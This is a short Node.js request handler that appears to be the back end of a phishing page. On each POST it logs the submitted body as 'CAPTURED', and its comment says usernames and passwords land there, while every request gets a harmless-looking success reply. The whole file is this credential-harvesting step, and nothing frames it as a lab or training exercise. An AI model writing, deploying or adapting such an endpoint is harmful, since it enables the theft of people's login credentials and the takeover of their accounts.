module.exports = (req, res) => {
  if (req.method === 'POST') {
    console.log('CAPTURED:', req.body); // username + password land here
  }
  res.status(200).json({ ok: true });
};